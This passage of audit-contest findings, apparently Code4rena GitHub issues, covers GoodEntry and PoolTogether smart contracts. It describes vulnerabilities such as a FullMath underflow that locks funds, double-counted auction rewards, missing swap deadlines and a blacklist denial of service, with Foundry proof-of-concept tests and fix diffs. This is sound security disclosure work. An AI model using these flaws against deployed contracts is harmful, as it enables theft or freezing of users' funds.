ROUTER.exactOutputSingle(ISwapRouter.ExactOutputSingleParams(path[0], path[1], feeTier, address(this), deadline, amountOut, amountInMax, 0));                  amounts[1] = amountOut;          ogInAsset.safeApprove(address(ROUTER), 0);         IWETH9 weth = IWETH9(ROUTER.WETH9());         acceptPayable = true;         weth.withdraw(amountOut);         acceptPayable = false;         payable(msg.sender).call{value: amountOut}(\"\"); +        ogInAsset.safeTransfer(msg.sender, amountInMax - amounts[0]);         emit Swap(msg.sender, path[0], path[1], amounts[0], amounts[1]);      } ```      ## Assessed type  ERC20"}, {"title": "RangeManager can push users below the lending protocol soft liquidation threshold", "html_url": "https://github.com/code-423n4/2023-08-goodentry-findings/issues/62", "labels": ["bug", "disagree with severity", "downgraded by judge", "grade-a", "primary issue", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2023-08-goodentry-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/RangeManager.sol#L206 https://github.com/GoodEntry-io/GoodEntryMarkets/blob/2e3d23016fadb45e188716d772cec7c2096fae01/contracts/protocol/lendingpool/LendingPool.sol.0x20#L514   # Vulnerability details  After performing operations that involve changing assets in the lending pool, `RangeManager` [checks the user health factor](https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/RangeManager.sol#L206) in its `cleanup()` function. This check is made against the hardcoded value of `1.01e18`. However, in ROE pools, [this parameter can be configured](https://github.com/GoodEntry-io/GoodEntryMarkets/blob/2e3d23016fadb45e188716d772cec7c2096fae01/contracts/protocol/lendingpool/LendingPool.sol.0x20#L514).  ## Impact The protocol can operate on users' lending positions and push them below the liquidation threshold, where somebody else can scalp a liquidation fee.  ## Proof of Concept This issue can be highlighted by comparing the soft-liquidation check [in `RangeManager`](https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/RangeManager.sol#L206): ```Solidity     // Check that health factor is not put into liquidation / with buffer     (,,,,,uint256 hf) = LENDING_POOL.getUserAccountData(msg.sender);     require(hf > 1.01e18, \"Health factor is too low\"); ``` ... with the check used [in the lending pool's check that allows liquidation](https://github.com/GoodEntry-io/GoodEntryMarkets/blob/2e3d23016fadb45e188716d772cec7c2096fae01/contracts/protocol/lendingpool/LendingPool.sol.0x20#L501): ```       require(healthFactor <= softLiquidationThreshold, \"Not initiated by user\"); ```  ## Tools Used  ## Recommended Mitigation Steps Read the threshold from the pool:  ```diff     // Check that health factor is not put into liquidation / with buffer     (,,,,,uint256 hf) = LENDING_POOL.getUserAccountData(msg.sender); -    require(hf > 1.01e18, \"Health factor is too low\"); +   require(hf > 0.01e18 + LENDING_POOL.softLiquidationThreshold(), \"Health factor is too low\"); ```   ## Assessed type  Invalid Validation"}, {"title": "Incorrect Solidity version in FullMath.sol can cause permanent freezing of assets for arithmetic underflow-induced revert", "html_url": "https://github.com/code-423n4/2023-08-goodentry-findings/issues/58", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "H-06"], "target": "2023-08-goodentry-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/TokenisableRange.sol#L227 https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/TokenisableRange.sol#L227  https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/TokenisableRange.sol#L240 https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/TokenisableRange.sol#L187 https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/TokenisableRange.sol#L338 https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/lib/FullMath.sol#L2   # Vulnerability details  `TokenisableRange` makes use of the `LiquidityAmounts.getAmountsForLiquidity` helper function in its [`returnExpectedBalanceWithoutFees`](https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/TokenisableRange.sol#L338),  [`getTokenAmountsExcludingFees`](https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/TokenisableRange.sol#L371C31-L371C31) and [`deposit`](https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/TokenisableRange.sol#L240C18-L240C18) functions to convert UniswapV3 pool liquidity into estimated underlying token amounts.   This function `getAmountsForLiquidity` will trigger an arithmetic underflow whenever `sqrtRatioX96` is smaller than `sqrtRatioAX96`, causing these functions to revert until this ratio comes back in range and the math no longer overflows.  Such oracle price conditions are not only possible but also likely to happen in real market conditions, and they can be permanent (i.e. one asset permanently appreciating over the other one).  Moving up the stack, assuming that `LiquidityAmounts.getAmountsForLiquidity` can revert (which is shown in the below PoC with real-world conditions), both the [`returnExpectedBalanceWithoutFees`](https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/TokenisableRange.sol#L338) and [`getTokenAmountsExcludingFees`](https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/TokenisableRange.sol#L371C31-L371C31) functions can revert. In particular, the former [is called by the `claimFee()`](https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/TokenisableRange.sol#L187) function, which is always called when [depositing](https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/TokenisableRange.sol#L227) and [withdrawing](https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/TokenisableRange.sol#L293) liquidity.  The root cause of this issue is that the FullMath.sol library, [imported from UniswapV3](https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/FullMath.sol) was [altered to build with solidity v0.8.x](https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/lib/FullMath.sol#L2), which has under/overflow protection; the library, however, makes use of these by design, so it won't work properly when compiled in v0.8.0 or later: ```Solidity /// @dev Handles \"phantom overflow\" i.e., allows multiplication and division where an intermediate value overflows 256 bits library FullMath { ```  ## Impact When the fair exchange price of the pool backing the TokenisableRange's falls outside the range (higher side), the `deposit` and `withdraw` will always revert, locking the underlying assets in the pool until the price swings to a different value that does not trigger an under/overflow. If the oracle price stays within this range indefinitely, the funds are permanently locked.  ## Proof of Concept I'll prove that permanent freezing can happen in two steps: - first I'll show one condition where the underflow happens - then, I'll set up a fuzz test to prove that given an A and B ticker, we cannot find a market price lower than A such that the underflow does not happen   The most simple way to prove the first point is by calling `LiquidityAmounts.getAmountsForLiquidity` in isolation with real-world values: ```solidity     function testGetAmountsForLiquidityRevert() public {         // real-world value: it's in fact the value returned by         // V3_FACTORY.getPool(USDC, WETH, 500).slot0();         // at block 17811921; it is around 1870 USDC per WETH         uint160 sqrtRatioX96 = 1834502451234584391374419429242405;          // start price and end corresponding to 1700 to 1800 USDC per WETH         uint160 sqrtRatioAX96 = 1866972058592130739290643700340936;         uint160 sqrtRatioBX96 = 1921904167735311150677430952623492;          vm.expectRevert();         LiquidityAmounts.getAmountsForLiquidity(sqrtRatioX96, sqrtRatioAX96, sqrtRatioBX96, 1e18);     } ```  However, a more integrated test that involves PositionManager can also be considered: ```     function testPocReturnExpectedBalanceUnderflow() public {         vm.createSelectFork(             \"mainnet\",             17811921         );         vm.startPrank(tokenWhale);         TokenisableRange tr = new TokenisableRange();         tr.initProxy(AaveOracle, USDC, WETH, 1700e10, 1800e10, \"Test1\", \"T1\", false);         USDC.approve(address(tr), 100_000e6);         tr.init(100_000e6, 0);         vm.expectRevert();         tr.returnExpectedBalance(0, 0);     } ```  Then, we can prove the second point with a negative fuzz test: ```Solidity     function testFailPermanentFreeze(uint160 sqrtRatioX96) public {         // start & and price, corresponding to 1700 to 1800 USDC per WETH         uint160 sqrtRatioAX96 = 1866972058592130739290643700340936;         uint160 sqrtRatioBX96 = 1921904167735311150677430952623492;          // make sure that the market ratio is lower than the lower ticker         // that is the range where I first observed the underflow         // (WETH above 1800 USDC)         sqrtRatioX96 = sqrtRatioX96 % (sqrtRatioAX96 - 1);          // expect a revert here         LiquidityAmounts.getAmountsForLiquidity(sqrtRatioX96, sqrtRatioAX96, sqrtRatioBX96, 1e18);     } ```  ## Tools Used IDE, Foundry  ## Recommended Mitigation Steps Restore [the original FullMath.sol library](https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/FullMath.sol) so it compiles with solc versions earlier than 0.8.0.  ```Solidity // SPDX-License-Identifier: GPL-3.0 - pragma solidity ^0.8.4; + pragma solidity >=0.4.0 <0.8.0;  /// @title Contains 512-bit math functions /// @notice Facilitates multiplication and division that can have overflow of an intermediate value without any loss of precision /// @dev Handles \"phantom overflow\" i.e., allows multiplication and division where an intermediate value overflows 256 bits ```  Another possible option, which is however not recommended, is to enclose the non-assembly statements of FullMath.sol in an `unchecked` block.             ## Assessed type  Under/Overflow"}, {"title": "RemoteOwner circular dependency at deployment time", "html_url": "https://github.com/code-423n4/2023-08-pooltogether-findings/issues/147", "labels": ["bug", "2 (Med Risk)", "high quality report", "primary issue", "selected for report", "sponsor confirmed", "M-01"], "target": "2023-08-pooltogether-findings", "body": "# Lines of code  https://github.com/GenerationSoftware/remote-owner/blob/9c093dbd36c1f18ab7083549d10ac601d91630df/src/RemoteOwner.sol#L58 https://github.com/GenerationSoftware/remote-owner/blob/9c093dbd36c1f18ab7083549d10ac601d91630df/src/RemoteOwner.sol#L120 https://github.com/GenerationSoftware/remote-owner/blob/9c093dbd36c1f18ab7083549d10ac601d91630df/src/RemoteOwner.sol#L96-L99 https://github.com/GenerationSoftware/pt-v5-draw-auction/blob/f1c6d14a1772d6609de1870f8713fb79977d51c1/src/RngAuctionRelayerRemoteOwner.sol#L47 https://github.com/GenerationSoftware/pt-v5-draw-auction/blob/f1c6d14a1772d6609de1870f8713fb79977d51c1/src/RngAuctionRelayerRemoteOwner.sol#L64   # Vulnerability details  ## Impact The `RemoteOwner.sol` contract has a security measure that ensures the sender from the remote/origin chain was the origin chain owner (i.e. a `RngAuctionRelayerRemoteOwner.sol` deployment), and this address is set at deployment time in the constructor. The `RngAuctionRelayerRemoteOwner` contract also has a security measure to ensure that messages are only dispatched across chain to the `RemoteOwner` contract deployed in the destination chain, and this address is set at deployment time in the constructor.  Clearly there is a circular dependency here that means the deployment phase will fail. There is a `setOriginChainOwner` method on the `RemoteOwner` contract, however this can only be called by the address on the origin chain specified in the constructor. This method is never called from the origin chain either. In summary, the circular dependency prevents the contracts from being deployed and ever initialised properly.  It is possible that there is an intermediary `__originChainOwner` used in the constructor when deploying `RemoteOwner`, but since I couldn't find any deployment scripts to verify this I have assumed that this is an unintended bug. The severity of this report depends on whether or not this was intended.  ## Proof of Concept In the `RemoteOwner.sol` contract, the origin chain owner is set in the constructor:  ```   constructor(     uint256 originChainId_,     address executor_,     address __originChainOwner   ) ExecutorAware(executor_) {     if (originChainId_ == 0) revert OriginChainIdZero();     _originChainId = originChainId_;     _setOriginChainOwner(__originChainOwner);   } ```  Any calls to the `RemoteOwner` contract are protected by the `_checkSender` view:  ```   function _checkSender() internal view {     if (!isTrustedExecutor(msg.sender)) revert LocalSenderNotExecutor(msg.sender);     if (_fromChainId() != _originChainId) revert OriginChainIdUnsupported(_fromChainId());     if (_msgSender() != address(_originChainOwner)) revert OriginSenderNotOwner(_msgSender());   } ```  Now, if we have a look at the `RngAuctionRelayerRemoteOwner.sol` contract, we can see that the remote owner address is also specified in the constructor:  ```     constructor(         RngAuction _rngAuction,         ISingleMessageDispatcher _messageDispatcher,         RemoteOwner _remoteOwner,         uint256 _toChainId     ) RngAuctionRelayer(_rngAuction) {         messageDispatcher = _messageDispatcher;         account = _remoteOwner;         toChainId = _toChainId;     } ```  This `account` address is now hard-coded and used with any calls to `relay`:  ``` function relay(         IRngAuctionRelayListener _remoteRngAuctionRelayListener,         address rewardRecipient     ) external returns (bytes32) {         bytes memory listenerCalldata = encodeCalldata(rewardRecipient);         bytes32 messageId = messageDispatcher.dispatchMessage(             toChainId,             address(account),             RemoteOwnerCallEncoder.encodeCalldata(address(_remoteRngAuctionRelayListener), 0, listenerCalldata)         );         emit RelayedToDispatcher(rewardRecipient, messageId);         return messageId;     } ```  There is a circular dependency here due to the reliance on specifying the relevant addresses in the constructor.  ## Tools Used Manual review  ## Recommended Mitigation Steps To remove the circular dependency and reliance on a very specific deployment pipeline that requires a specific call from a remote chain address, I would make the following change to the `RemoteOwner` contract:  ``` diff --git a/src/RemoteOwner.sol b/src/RemoteOwner.sol index 7c1de6d..a6cb8f1 100644 --- a/src/RemoteOwner.sol +++ b/src/RemoteOwner.sol @@ -55,7 +55,6 @@ contract RemoteOwner is ExecutorAware {    ) ExecutorAware(executor_) {      if (originChainId_ == 0) revert OriginChainIdZero();      _originChainId = originChainId_; -    _setOriginChainOwner(__originChainOwner);    }      /* ============ External Functions ============ */ @@ -94,7 +93,7 @@ contract RemoteOwner is ExecutorAware {     *      If the transaction get front-run at deployment, we can always re-deploy the contract.     */    function setOriginChainOwner(address _newOriginChainOwner) external { -    _checkSender(); +    require(_originChainOwner == address(0), \"Already initialized\");      _setOriginChainOwner(_newOriginChainOwner);    }   ```  However I can understand how the current deployment pipeline functionality would make it harder to frontrun `setOriginChainOwner` if this was done deliberately, so alternatively you could keep the functionality the same but just provide better comments.   ## Assessed type  Other"}, {"title": "PRBMATH `SD59x18.exp()` reverts on hugely negative numbers.", "html_url": "https://github.com/code-423n4/2023-08-pooltogether-findings/issues/146", "labels": ["bug", "2 (Med Risk)", "high quality report", "primary issue", "selected for report", "sponsor confirmed", "M-02"], "target": "2023-08-pooltogether-findings", "body": "# Lines of code  https://github.com/GenerationSoftware/pt-v5-cgda-liquidator/blob/7f95bcacd4a566c2becb98d55c1886cadbaa8897/src/libraries/ContinuousGDA.sol#L34-L36 https://github.com/GenerationSoftware/pt-v5-cgda-liquidator/blob/7f95bcacd4a566c2becb98d55c1886cadbaa8897/src/libraries/ContinuousGDA.sol#L64 https://github.com/GenerationSoftware/pt-v5-cgda-liquidator/blob/7f95bcacd4a566c2becb98d55c1886cadbaa8897/src/libraries/ContinuousGDA.sol#L85-L87 https://github.com/PaulRBerg/prb-math/blob/5959ef59f906d689c2472ed08797872a1cc00644/src/sd59x18/Math.sol#L168-L181   # Vulnerability details  ## Impact `ContinuousGDA.sol` inherits a version of `PRB Math` that contains a vulnerability in the `SD59x18.exp()` function, which can be reverted on hugely negative numbers. `SD59x18.exp()` is used for calculations in `ContinuousGDA.sol#purchasePrice()` , `ContinuousGDA.sol#purchaseAmount()` and `ContinuousGDA.sol#computeK()`. Recently, the creators of the `PRBMath` have acknowledged this situation. Here is the corresponding [link](https://github.com/PaulRBerg/prb-math/issues/200). This issue should be proactively corrected by `PoolTogether` to avoid unexpected results that corrupt the protocol's computation flow. ## Proof of Concept There are 05 instances of this issue: [see here](https://github.com/GenerationSoftware/pt-v5-cgda-liquidator/blob/7f95bcacd4a566c2becb98d55c1886cadbaa8897/src/libraries/ContinuousGDA.sol#L34-L36) ``` File: ContinuousGDA.sol 34:    topE = topE.exp().sub(ONE); 36:    bottomE = bottomE.exp(); 64:    SD59x18 exp = _decayConstant.mul(_timeSinceLastAuctionStart).exp(); 85:    SD59x18 eValue = exponent.exp(); 87:    SD59x18 denominator = (_decayConstant.mul(_purchaseAmount).div(_emissionRate)).exp().sub(ONE); ``` [Proof of the bug acknowledgment by the creator of the PRBMath](https://github.com/PaulRBerg/prb-math/issues/200) `SD59x18.exp()` correctly returns 0 for inputs less than (roughly) -41.45e18, however it starts to throw `PRBMath_SD59x18_Exp2_InputTooBig` when the input gets hugely negative. This is because of the unchecked multiplication in `exp()` overflowing into positive values: [see here](https://github.com/PaulRBerg/prb-math/blob/5959ef59f906d689c2472ed08797872a1cc00644/src/sd59x18/Math.sol#L168-L181) ``` function exp(SD59x18 x) pure returns (SD59x18 result) {     int256 xInt = x.unwrap();      // This check prevents values greater than 192e18 from being passed to {exp2}.     if (xInt > uEXP_MAX_INPUT) {         revert Errors.PRBMath_SD59x18_Exp_InputTooBig(x);     }      unchecked {         // Inline the fixed-point multiplication to save gas.         int256 doubleUnitProduct = xInt * uLOG2_E;                // <== overflow         result = exp2(wrap(doubleUnitProduct / uUNIT));     } } ``` ## Tools Used Manual Review and [Proof of the bug acknowledgment by the creator of the PRBMath](https://github.com/PaulRBerg/prb-math/issues/200) ## Recommended Mitigation Steps A potential fix would be to compare the input with the smallest (most negative) number that can be safely multiplied by `uLOG2_E`, and return 0 if it's smaller. Alternatively, `exp()` could return 0 for inputs smaller than -41.45e18, which are expected to be truncated to zero by `exp2()` anyway.   ## Assessed type  Math"}, {"title": "Too many rewards are distributed when a draw is closed", "html_url": "https://github.com/code-423n4/2023-08-pooltogether-findings/issues/139", "labels": ["bug", "3 (High Risk)", "high quality report", "primary issue", "selected for report", "sponsor confirmed", "H-01"], "target": "2023-08-pooltogether-findings", "body": "# Lines of code  https://github.com/GenerationSoftware/pt-v5-draw-auction/blob/f1c6d14a1772d6609de1870f8713fb79977d51c1/src/RngRelayAuction.sol#L178-L184 https://github.com/GenerationSoftware/pt-v5-draw-auction/blob/f1c6d14a1772d6609de1870f8713fb79977d51c1/src/RngRelayAuction.sol#L154-L157 https://github.com/GenerationSoftware/pt-v5-prize-pool/blob/26557afa439934afc080eca6165fe3ce5d4b63cd/src/PrizePool.sol#L366 https://github.com/GenerationSoftware/pt-v5-prize-pool/blob/26557afa439934afc080eca6165fe3ce5d4b63cd/src/abstract/TieredLiquidityDistributor.sol#L374   # Vulnerability details  ## Impact A relayer completes a prize pool draw by calling `rngComplete` in `RngRelayAuction.sol`. This method closes the prize pool draw with the relayed random number and distributes the rewards to the RNG auction recipient and the RNG relay auction recipient. These rewards are calculated based on a fraction of the prize pool reserve rather than an actual value.  However, the current reward calculation mistakenly includes an extra `reserveForOpenDraw` amount just after the draw has been closed. Therefore the fraction over which the rewards are being calculated includes tokens that have not been added to the reserve and will actually only be added to the reserve when the next draw is finalised. As a result, the reward recipients are rewarded too many tokens.   ## Proof of Concept Before deciding whether or not to relay an auction result, a bot can call `computeRewards` to calculate how many rewards they'll be getting based on the size of the reserve, the state of the auction and the reward fraction of the RNG auction recipient:  ```   function computeRewards(AuctionResult[] calldata __auctionResults) external returns (uint256[] memory) {     uint256 totalReserve = prizePool.reserve() + prizePool.reserveForOpenDraw();     return _computeRewards(__auctionResults, totalReserve);   } ```  Here, the total reserve is calculated as the sum of the current reserve and and amount of new tokens that will be added to the reserve once the currently open draw is closed. This method is correct and correctly calculates how many rewards should be distributed when a draw is closed.  A bot can choose to close the draw by calling `rngComplete` (via a relayer), at which point the rewards are calculated and distributed. Below is the interesting part of this method:  ```     uint32 drawId = prizePool.closeDraw(_randomNumber);      uint256 futureReserve = prizePool.reserve() + prizePool.reserveForOpenDraw();     uint256[] memory _rewards = RewardLib.rewards(auctionResults, futureReserve); ```  As you can see, the draw is first closed and then the future reserve is used to calculate the rewards that should be distributed. However, when `closeDraw` is called on the pool, the `reserveForOpenDraw` for the previously open draw is added to the existing reserves. So `reserve()` is now equal to the `totalReserve` value in the earlier call to `computeRewards`. By including `reserveForOpenDraw()` when computing the actual reward to be distributed we've accidentally counted the tokens that are only going to be added in when the next draw is closed. So now the rewards distribution calculation includes the pending reserves for 2 draws rather than 1.  ## Tools Used Manual review  ## Recommended Mitigation Steps When distributing rewards in the call to `rngComplete`, the rewards should not be calculated with the new value of `reserveForOpenDraw` because the previous `reserveForOpenDraw` value has already been added to the reserves when `closeDraw` is called on the prize pool. Below is a suggested diff:  ``` diff --git a/src/RngRelayAuction.sol b/src/RngRelayAuction.sol index 8085169..cf3c210 100644 --- a/src/RngRelayAuction.sol +++ b/src/RngRelayAuction.sol @@ -153,8 +153,8 @@ contract RngRelayAuction is IRngAuctionRelayListener, IAuction {        uint32 drawId = prizePool.closeDraw(_randomNumber);   -    uint256 futureReserve = prizePool.reserve() + prizePool.reserveForOpenDraw(); -    uint256[] memory _rewards = RewardLib.rewards(auctionResults, futureReserve); +    uint256 reserve = prizePool.reserve(); +    uint256[] memory _rewards = RewardLib.rewards(auctionResults, reserve);        emit RngSequenceCompleted(        _sequenceId,  ```   ## Assessed type  Math"}, {"title": " Missing `deadline` param in `swapExactAmountOut()` allowing outdated slippage and allow pending transaction to be executed unexpectedly.", "html_url": "https://github.com/code-423n4/2023-08-pooltogether-findings/issues/126", "labels": ["bug", "2 (Med Risk)", "high quality report", "primary issue", "selected for report", "sponsor confirmed", "M-03"], "target": "2023-08-pooltogether-findings", "body": "# Lines of code  https://github.com/GenerationSoftware/pt-v5-cgda-liquidator/blob/7f95bcacd4a566c2becb98d55c1886cadbaa8897/src/LiquidationRouter.sol#L63-L80 https://github.com/GenerationSoftware/pt-v5-cgda-liquidator/blob/7f95bcacd4a566c2becb98d55c1886cadbaa8897/src/LiquidationPair.sol#L211-L226   # Vulnerability details   ## Impact  Loss of funds/tokens for the protocol, since block execution is delegated to the block validator without a hard deadline.  ## Proof of Concept  The function `swapExactAmountOut()` from `LiquidationRouter.sol` and `LiquidationPair.sol` use these methods to swap tokens:  `source.liquidate(_account, tokenIn, swapAmountIn, tokenOut, _amountOut);`  and  `_liquidationPair.swapExactAmountOut(_receiver, _amountOut, _amountInMax);`  https://github.com/GenerationSoftware/pt-v5-cgda-liquidator/blob/7f95bcacd4a566c2becb98d55c1886cadbaa8897/src/LiquidationPair.sol#L211-L226  https://github.com/GenerationSoftware/pt-v5-cgda-liquidator/blob/7f95bcacd4a566c2becb98d55c1886cadbaa8897/src/LiquidationRouter.sol#L63-L80  Both methods make sure to pass slippage (minimum amount out), but miss to provide the deadline which is crucial to avoid unexpected trades/losses for users and protocol.  Without a deadline, the transaction might be left hanging in the mempool and be executed way later than the user wanted.  That could lead to users/protocol getting a worse price, because a validator can just hold onto the transaction. And when it does get around to putting the transaction in a block  One part of this change is that PoS block proposers know ahead of time if they're going to propose the next block. The validators and the entire network know who's up to bat for the current block and the next one.  This means the block proposers are known for at least 6 minutes and 24 seconds and at most 12 minutes and 48 seconds.  Further reading: https://blog.bytes032.xyz/p/why-you-should-stop-using-block-timestamp-as-deadline-in-swaps  ## Tools Used Manual  ## Recommended Mitigation Steps  Let users provide a fixed deadline as param, and also never set deadline to `block.timestamp`.    ## Assessed type  Other"}, {"title": "Potential Near-Zero Scenarios for purchasePrice in the Continuous Gradual Dutch Auction", "html_url": "https://github.com/code-423n4/2023-08-pooltogether-findings/issues/122", "labels": ["bug", "2 (Med Risk)", "high quality report", "primary issue", "selected for report", "sponsor confirmed", "edited-by-warden", "M-04"], "target": "2023-08-pooltogether-findings", "body": "# Lines of code  https://github.com/GenerationSoftware/pt-v5-cgda-liquidator/blob/7f95bcacd4a566c2becb98d55c1886cadbaa8897/src/LiquidationPair.sol#L211-L226 https://github.com/GenerationSoftware/pt-v5-cgda-liquidator/blob/7f95bcacd4a566c2becb98d55c1886cadbaa8897/src/LiquidationPair.sol#L294-L319 https://github.com/GenerationSoftware/pt-v5-cgda-liquidator/blob/7f95bcacd4a566c2becb98d55c1886cadbaa8897/src/libraries/ContinuousGDA.sol#L16-L44   # Vulnerability details  ## Impact The Continuous Gradual Dutch Auction (CGDA) model has potential scenarios where the `purchasePrice` for an amount of tokens could approach near-zero values. This is influenced mainly by two factors: `_emissionRate` and `_timeSinceLastAuctionStart`. If either one or both of these factors (`_emissionRate` specifically more likely) are significantly large, the `purchasePrice` could drastically drop.  This condition could cause undesired economic effects in the auction process. Under this context, participants may acquire tokens (amount of Vault shares) at an extremely low price (very low POOL amount indeed), which could lead to significant chance of winnings.  ## Proof of Concept Here is the purchasePrice function within the ContinuousGDA library, which computes the purchase price of tokens based on various parameters.  https://github.com/GenerationSoftware/pt-v5-cgda-liquidator/blob/7f95bcacd4a566c2becb98d55c1886cadbaa8897/src/libraries/ContinuousGDA.sol#L23-L44  ```solidity   function purchasePrice(     SD59x18 _amount,     SD59x18 _emissionRate,     SD59x18 _k,     SD59x18 _decayConstant,     SD59x18 _timeSinceLastAuctionStart   ) internal pure returns (SD59x18) {     if (_amount.unwrap() == 0) {       return SD59x18.wrap(0);     }     SD59x18 topE = _decayConstant.mul(_amount).div(_emissionRate);     topE = topE.exp().sub(ONE);     SD59x18 bottomE = _decayConstant.mul(_timeSinceLastAuctionStart);     bottomE = bottomE.exp();     SD59x18 result;     if (_emissionRate.unwrap() > 1e18) {       result = _k.div(_emissionRate).mul(topE).div(bottomE);     } else {       result = _k.mul(topE.div(_emissionRate.mul(bottomE)));     }     return result;   } ``` One possible scenarios where `purchasePrice` could approach near-zero values is: _k = 1e18 (the initial price of the CGDA) _decayConstant = 0.00001 (a very small decay constant) _amount = 1e18 (the amount of tokens to purchase which has reportedly become a rare commodity) _emissionRate = 1e20 (a significantly large, but more practical emission rate) _timeSinceLastAuctionStart = 3600 (equivalent to 1 hour)  The small `_decayConstant`, along with the relatively short `_timeSinceLastAuctionStart`, results in `bottomE` being close to 1. `_emissionRate` is significantly larger than `_amount`, making `topE` also close to 1. As a result, this combination of factors drives the `purchasePrice` towards near-zero values.   Please note that this is only one of many possible scenarios where the purchase price could approach near-zero values. Other combinations of parameter tweaks could potentially also lead to similar or more likely outcomes.  ## Tools Used Manual  ## Recommended Mitigation Steps 1. Introduce checks in the `_computeExactAmountIn` function to ensure that `_emissionRate` doesn't exceed a certain practical limit. 2. Introduce checks in function `swapExactAmountOut` that the scaled ratio of `_amountInForPeriod` to `_amountOutForPeriod` should not fall below a certain threshold.       ## Assessed type  Context"}, {"title": "RngRelayAuction.rngComplete() DOS attack", "html_url": "https://github.com/code-423n4/2023-08-pooltogether-findings/issues/92", "labels": ["bug", "2 (Med Risk)", "high quality report", "primary issue", "selected for report", "sponsor confirmed", "M-05"], "target": "2023-08-pooltogether-findings", "body": "# Lines of code  https://github.com/GenerationSoftware/pt-v5-draw-auction/blob/f1c6d14a1772d6609de1870f8713fb79977d51c1/src/RngRelayAuction.sol#L170   # Vulnerability details  ## Impact If the recipient maliciously enters the blacklist of `priceToken`, it may cause `rngComplete()` to fail to execute successfully  ## Proof of Concept The current implementation of `RngRelayAuction.rngComplete()` immediately transfers the `prizeToken` to the `recipient`  ```solidity   function rngComplete(     uint256 _randomNumber,     uint256 _rngCompletedAt,     address _rewardRecipient,     uint32 _sequenceId,     AuctionResult calldata _rngAuctionResult   ) external returns (bytes32) { ...     for (uint8 i = 0; i < _rewards.length; i++) {       uint104 _reward = uint104(_rewards[i]);       if (_reward > 0) { @>      prizePool.withdrawReserve(auctionResults[i].recipient, _reward);         emit AuctionRewardDistributed(_sequenceId, auctionResults[i].recipient, i, _reward);       }     }   ..  ```solidity contract PrizePool is TieredLiquidityDistributor {   function withdrawReserve(address _to, uint104 _amount) external onlyDrawManager {     if (_amount > _reserve) {       revert InsufficientReserve(_amount, _reserve);     }     _reserve -= _amount; @>  _transfer(_to, _amount);     emit WithdrawReserve(_to, _amount);   }    function _transfer(address _to, uint256 _amount) internal {     _totalWithdrawn += _amount; @>  prizeToken.safeTransfer(_to, _amount);   }  ```  There is a risk that if `prizeToken` is a `token` with a blacklisting mechanism, such as :`USDC`.  then `recipient` can block `rngComplete()` by maliciously entering the `USDC` blacklist.  Since `RngAuctionRelayer` supports `AddressRemapper`, users can more simply specify blacklisted addresses via `remapTo()`   ## Tools Used  ## Recommended Mitigation Steps  Add `claims` mechanism, `rngComplete()` only record `cliamable[token][user]+=rewards` Users themselves go to `claims`   ## Assessed type  Context"}, {"title": "_computeAvailable() the calculations are wrong", "html_url": "https://github.com/code-423n4/2023-08-pooltogether-findings/issues/90", "labels": ["bug", "2 (Med Risk)", "high quality report", "primary issue", "selected for report", "sponsor confirmed", "M-06"], "target": "2023-08-pooltogether-findings", "body": "# Lines of code  https://github.com/GenerationSoftware/pt-v5-vault-boost/blob/9d640051ab61a0fdbcc9500814b7f8242db9aec2/src/VaultBooster.sol#L277   # Vulnerability details  ## Impact `_computeAvailable()` incorrect calculations that result in a return value greater than the current balance, causing methods such as `liquidate` to fail  ## Proof of Concept `VaultBooster._computeAvailable()` used to count the number of `tokens` currently available There are two conditions  1. `accrue` continuously according to time 2. the final cumulative value cannot be greater than the current contract balance  The code is as follows: ```solidity   function _computeAvailable(IERC20 _tokenOut) internal view returns (uint256) {     Boost memory boost = _boosts[_tokenOut];     uint256 deltaTime = block.timestamp - boost.lastAccruedAt;     uint256 deltaAmount;     if (deltaTime == 0) {       return boost.available;     }     if (boost.tokensPerSecond > 0) {       deltaAmount = boost.tokensPerSecond * deltaTime;     }     if (boost.multiplierOfTotalSupplyPerSecond.unwrap() > 0) {       uint256 totalSupply = twabController.getTotalSupplyTwabBetween(address(vault), uint32(boost.lastAccruedAt), uint32(block.timestamp));       deltaAmount += convert(boost.multiplierOfTotalSupplyPerSecond.intoUD60x18().mul(convert(deltaTime)).mul(convert(totalSupply)));     } @>  uint256 availableBalance = _tokenOut.balanceOf(address(this)); @>  deltaAmount = availableBalance > deltaAmount ? deltaAmount : availableBalance;     return boost.available + deltaAmount;   } ```  The current implementation code, limiting the maximum value of `deltaAmount` is wrong, using the 